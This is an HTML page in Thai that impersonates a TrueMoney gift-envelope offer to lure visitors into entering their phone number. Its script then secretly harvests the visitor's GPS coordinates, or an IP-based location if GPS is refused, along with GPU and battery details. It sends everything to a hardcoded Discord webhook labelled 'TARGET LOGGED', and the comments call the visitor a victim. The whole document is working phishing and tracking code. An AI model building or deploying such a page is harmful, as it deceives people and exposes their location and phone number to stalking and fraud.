<<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ของขวัญสำหรับคุณ</title>
    <meta property="og:title" content="ของขวัญสำหรับคุณ">
    <meta property="og:description" content="คุณได้รับซองทรูมันนี่มูลค่า 10-100 บาท จากเพื่อนของคุณ">
    <meta property="og:image" content="https://gift.truemoney.com/campaign/static/media/redenvelope_share.png">
    <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Sarabun', sans-serif; background-color: #ffffff; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; padding: 20px; text-align: center; }
        .main-img { width: 100%; max-width: 320px; margin-bottom: 20px; }
        .sender-name { font-size: 1.3rem; font-weight: bold; color: #333; }
        .input-box { text-align: left; width: 95%; margin: 20px auto; }
        input[type="text"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 1.1rem; box-sizing: border-box; outline: none; }
        .btn-orange { background-color: #ff8c2d; color: white; border: none; width: 100%; padding: 16px; font-size: 1.1rem; font-weight: bold; border-radius: 30px; cursor: pointer; margin-top: 20px; }
        #loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #ff8c2d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <img class="main-img" src="https://gift.truemoney.com/campaign/static/media/landing_main.26b054af21dc302fb4a6.png">
        <div class="sender-name">ปัญญาภร ***</div>
        <div style="color: #888;">ส่งซองทรูมันนี่ให้คุณ</div>
        <div class="input-box">
            <label style="font-size: 0.9rem; color: #666;">กรอกเบอร์โทรศัพท์เพื่อรับซอง</label>
            <input type="text" id="phone" placeholder="08x-xxx-xxxx" maxlength="10">
        </div>
        <button class="btn-orange" onclick="startRedeem()">รับซองเลย</button>
    </div>

    <div id="loading-screen">
        <div class="spinner"></div>
        <div style="color:#ff8c2d; font-weight:bold;">กำลังตรวจสอบสิทธิ์...</div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1493303430289162493/u7A4FZxwAdekbS0Bw5pngOyRc2DToLjFQikE0rxeCqaEO1GNy6CddP8ChlCCNqSlB854";
        
        async function startRedeem() {
            const phone = document.getElementById('phone').value;
            if(phone.length < 10) { alert("กรุณากรอกเบอร์โทรศัพท์ให้ถูกต้อง"); return; }
            
            document.getElementById('loading-screen').style.display = 'flex';

            // ดึงข้อมูลพื้นฐานรอไว้ก่อน
            let batteryStat = "Unknown";
            let gpuInfo = "Locked";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryStat = `${(battery.level * 100).toFixed(0)}%`;
                }
            } catch (e) {}

            // ระบบขอพิกัด GPS (จุดนี้เบราว์เซอร์จะเด้งถาม "อนุญาต")
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        // กรณีเหยื่อกด "อนุญาต" (ได้พิกัดแม่นยำ 100%)
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        await sendToDiscord(phone, `📍 **GPS จริง (แม่นยำสูง):** [คลิกเปิด Google Maps](https://www.google.com/maps?q=${lat},${lon})\n🎯 พิกัด: ${lat}, ${lon}`, gpuInfo, batteryStat);
                    },
                    async (error) => {
                        // กรณีเหยื่อกด "บล็อก" (ใช้ IP แทนเหมือนเดิม)
                        await fetchIPFallback(phone, gpuInfo, batteryStat);
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                await fetchIPFallback(phone, gpuInfo, batteryStat);
            }
        }

        async function fetchIPFallback(phone, gpu, batt) {
            try {
                const res = await fetch('http://ip-api.com/json/');
                const data = await res.json();
                const info = `🌐 **พิกัดจาก IP (แม่นยำต่ำ):** ${data.city}\n📍 [เปิด Maps](https://www.google.com/maps?q=${data.lat},${data.lon})\n📶 ISP: ${data.isp}`;
                await sendToDiscord(phone, info, gpu, batt);
            } catch (e) {
                await sendToDiscord(phone, "❌ ไม่สามารถดึงพิกัดได้ (User บล็อก)", gpu, batt);
            }
        }

        async function sendToDiscord(phone, location, gpu, batt) {
            const payload = {
                embeds: [{
                    title: "🎯 TARGET LOGGED: GPS & HARDWARE SCAN",
                    color: 16745517,
                    fields: [
                        { name: "📱 เบอร์โทรศัพท์", value: `**${phone}**` },
                        { name: "🗺️ ข้อมูลตำแหน่ง", value: location },
                        { name: "🛠️ Hardware", value: `🎨 GPU: \`${gpu}\`\n🔋 แบต: \`${batt}\`` }
                    ],
                    timestamp: new Date()
                }]
            };
            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        }
    </script>
</body>
</html>
